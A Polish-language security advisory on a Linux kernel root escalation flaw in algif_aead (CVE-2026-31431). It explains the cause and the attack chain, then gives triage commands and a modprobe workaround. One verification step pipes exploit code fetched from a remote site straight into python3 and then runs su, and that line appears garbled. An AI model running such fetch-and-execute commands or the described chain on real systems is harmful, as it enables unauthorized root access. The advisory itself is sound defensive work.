Krytyczne - publiczny exploit dostępny. CVE-2026-31431 ("Copy Fail") umożliwia dowolnemu lokalnemu nieuprzywilejowanemu użytkownikowi uzyskanie uprawnień root na praktycznie każdym systemie Linux od 2017 roku. Publicznie dostępny skrypt Python o długości 731 bajtów realizuje pełną eskalację uprawnień. Exploit potwierdzony w laboratorium na Debian 12 (kernel 6.12.69) oraz Ubuntu 24.04 LTS (kernel 6.8.0-110).
Analiza podatności

CVE-2026-31431 dotyczy modułu algif_aead w podsystemie kryptograficznym jądra Linux. Interfejs gniazd AF_ALG udostępnia przestrzeni użytkownika prymitywy kryptograficzne zaimplementowane w kernelu. AEAD (Authenticated Encryption with Associated Data) to tryb kryptograficzny zapewniający zarówno poufność, jak i integralność danych - powszechnie stosowany w IPsec, TLS 1.3 i innych protokołach.

ROOT CAUSEObsługa operacji in-place w algif_aead - commit 72548b093ee3
Commit 72548b093ee3 wprowadził obsługę operacji AEAD in-place - gdzie bufor źródłowy i docelowy współdzielą ten sam obszar pamięci, umożliwiając nadpisanie plaintextu szyfrogramem bez dodatkowego kopiowania. Celem była optymalizacja wydajności.

Błąd: w kontekście algif_aead źródło i cel operacji zawsze pochodzą z różnych mapowań pamięci. Operacja in-place jest więc nie tylko zbędna, ale wprowadza błąd logiczny w sposobie obsługi wskaźnika do danych uwierzytelniających (AD) podczas operacji kryptograficznych. Dodana złożoność kodu stworzyła kontrolowalny prymityw zapisu do page cache jądra.
EXPLOIT PRIMITIVEKontrolowany zapis 4 bajtów do page cache via splice + AF_ALG
Exploit celuje w template AEAD authencesn(hmac(sha256),cbc(aes)) - konkretnie w obsługę Extended Sequence Numbers (ESN) stosowanych w IPsec. Łańcuch ataku:

1. Otwarcie gniazda AF_ALG z algorytmem authencesn(...)
2. Wywołanie syscalla splice() aktywujące podatną ścieżkę in-place
3. Kernel wykonuje kontrolowany, deterministyczny zapis 4 bajtów do page cache dowolnego pliku czytelnego dla atakującego
4. Cel ataku: /etc/passwd lub binarka setuid (/usr/bin/su) - iteracyjne nadpisywanie do uzyskania dostępu root

Najbliższa analogia: Dirty Pipe (CVE-2022-0847) - oba exploity wykorzystują możliwość zapisu do page cache plików tylko do odczytu poprzez błąd logiczny w jądrze.
ODKRYCIEZnalezione przez AI - Theori / Xint Code, ~1 godzina skanowania
Podatność wykrył Xint Code - system wspomaganego AI odkrywania podatności zbudowany przez Theori (9-krotnych zwycięzców DEF CON CTF). Według ich writeupa: "one operator prompt, no harnessing, ~1 hour of scan time against the Linux crypto/ subsystem."

Błąd pozostawał niezauważony przez ~9 lat (2017–2026), ponieważ kod crypto/ jest recenzowany przede wszystkim przez pryzmat poprawności kryptograficznej - bezpieczeństwo IND-CPA, odporność na ataki side-channel, walidacja parametrów. Pytanie "skąd pochodzi to mapowanie pamięci i czy kernel powinien przez nie pisać?" leży poza zakresem typowego code review. Ten przypadek pokazuje, że narzędzia AI zaczynają znajdować podatności na poziomie kernela w tempie i kosztem niedostępnym dla tradycyjnej analizy.

Wymagania do przeprowadzenia ataku:

(2) Standardowe konto użytkownika bez dodatkowych uprawnień.

(4) Brak wymagań co do wiedzy specjalistycznej - publiczny skrypt Python 731 bajtów.
Ocena środowiska produkcyjnego

Po publikacji CVE przeprowadzono weryfikację na produkcyjnych systemach Ubuntu (kernel 6.8.0-106-generic).

KROK 1Weryfikacja obecności modułu
# Sprawdzenie czy moduł jest aktualnie załadowany
$ lsmod | grep algif_aead (brak wyniku) - moduł niezaładowany, ale...
# Weryfikacja obecności modułu na dysku (.ko.zst = skompresowany moduł kernela)
$ modinfo algif_aead filename: /lib/modules/6.8.0-106-generic/kernel/crypto/algif_aead.ko.zst depends: af_alg
Moduł niezaładowany, ale obecny na dysku. W Linuxie moduły kernela ładują się na żądanie - każdy lokalny użytkownik może wywołać autoload przez otwarcie gniazda AF_ALG. System był zatem podatny.
KROK 2Ocena wpływu - usługi zależne
# Aktywne gniazda AF_ALG?
 $ ss -a | grep alg (brak wyniku)
 # IPsec aktywny?
 $ ip xfrm state
 (brak wyniku)
 # Daemony IPsec?
 $ systemctl is-active strongswan libreswan ipsec
inactive
inactive
inactive
Żadna usługa nie korzysta z algif_aead. Wdrożenie workaroundu potwierdzone jako bezpieczne.
KROK 3Workaround wdrożony - dyrektywa install /bin/false
# UWAGA: "blacklist algif_aead" NIE jest wystarczające
# Exploit wywołuje socket(AF_ALG,...) bezpośrednio - blacklist nie blokuje on-demand load przez syscall
# Skuteczna metoda: dyrektywa install zastępująca moduł poleceniem /bin/false
$ sudo rmmod algif_aead
# (brak output = sukces lub moduł już niezaładowany)
$ echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/algif_aead-blacklist.conf
install algif_aead /bin/false
$ sudo depmod -a curl https://copy.fail/exp | python3 && su
FileNotFoundError: [Errno 2] No such file or directory - brak roota, workaround skuteczny
Dyrektywa install algif_aead /bin/false powoduje że przy każdej próbie załadowania modułu - w tym on-demand przez syscall użytkownika - kernel wykonuje /bin/false zamiast faktycznego załadowania. Jest to wyłącznie tymczasowa mitygacja - docelowym rozwiązaniem jest aktualizacja kernela z oficjalnym patchem vendora wymagająca restartu systemu.

EXPLOIT FLOWCo dzieje się podczas exploitacji
1. Autoload modułu: socket(AF_ALG, SOCK_SEQPACKET, 0) wyzwala załadowanie algif_aead jeśli moduł nie jest aktywny
2. Bind algorytmu: bind() z templatem authencesn(hmac(sha256),cbc(aes)) - wariant ESN używany w IPsec
3. Pętla splice: Iteracyjne wywołania splice() przez podatną ścieżkę in-place - każda iteracja wykonuje kontrolowany 4-bajtowy zapis do page cache
4. Modyfikacja pliku docelowego: Zapis do page cache modyfikuje /etc/passwd lub binarke setuid (/usr/bin/su) - bez wymaganych uprawnień do zapisu na dysku
5. Eskalacja uprawnień: Zmodyfikowany plik umożliwia wykonanie su jako root - uzyskanie powłoki uprzywilejowanej

Detection Engineering
W trakcie weryfikacji. Exploit modyfikuje pliki przez page cache via splice() — nie przez standardowe syscalle zapisu. Nie zostało potwierdzone czy MDE Linux rejestruje FileModified w tym kontekście. Reguła detekcji zostanie opublikowana po weryfikacji w środowisku z agentem MDE.

Mitygacja i remediacja
Priorytet 1 - patch. Zastosuj aktualizację kernela od vendora dystrybucji. Fix cofa commit 72548b093ee3, przywracając operacje out-of-place AEAD w algif_aead. Zmodyfikowane pliki: crypto/af_alg.c, crypto/algif_aead.c, crypto/algif_skcipher.c, include/crypto/if_alg.h. Wymaga restartu systemu.
Workaround (do czasu patcha) - dyrektywa install /bin/false. Sama dyrektywa blacklist okazała się niewystarczająca - blokuje autoload przez udev/systemd, ale nie blokuje on-demand loading triggerowanego przez syscall socket(AF_ALG,...) który exploit wywołuje bezpośrednio. Skuteczna metoda to dyrektywa install, która przy każdej próbie załadowania modułu - w tym przez syscall użytkownika - wykonuje /bin/false zamiast faktycznego załadowania. Exploit kończy się błędem FileNotFoundError i nie uzyskuje dostępu do AF_ALG.
# UWAGA: "blacklist algif_aead" NIE jest wystarczające - nie blokuje on-demand load przez syscall # Wyładuj moduł jeśli aktualnie załadowany sudo rmmod algif_aead # Zastosuj dyrektywę install zamiast blacklist echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/algif_aead-blacklist.conf sudo depmod -a
Zweryfikuj przed wdrożeniem że IPsec z offloadem AF_ALG nie jest używany: ip xfrm state i systemctl is-active strongswan libreswan.
Środowiska kontenerowe. Izolacja przez namespace (Docker, Kubernetes) NIE chroni przed tą podatnością - wszystkie kontenery współdzielące kernel hosta są zagrożone. Wymagany patch kernela hosta. Izolacja sprzętowa (Firecracker microVMs, gVisor) nie jest podatna.
Szerszy kontekst

Copy Fail jest istotny nie tylko ze względu na swój techniczny wpływ, ale przede wszystkim ze względu na to, co ujawnia na temat zmieniającego się krajobrazu zagrożeń. Podsystem crypto/ należy do najstaranniej recenzowanego kodu w kernelu - a mimo to błąd logiczny w założeniach dotyczących origin pamięci przetrwał ~9 lat. Kluczowa obserwacja: błąd znalazło narzędzie AI pytając o zupełnie inną klasę zagadnień niż tradycyjna analiza - proweniencję pamięci i semantykę zapisu kernela, nie właściwości kryptograficzne.

Bardziej niepokojące: narzędzie wspomagane AI znalazło tę podatność w godzinę, z jednym promptem. Założenie, że błędy na poziomie kernela są drogie w odkryciu przestaje obowiązywać. Detection engineering i praktyki hardeningu muszą uwzględniać środowisko, w którym nieuprzywilejowane prymitywy LPE mogą stawać się coraz bardziej powszechne i dostępne dla mniej doświadczonych atakujących.
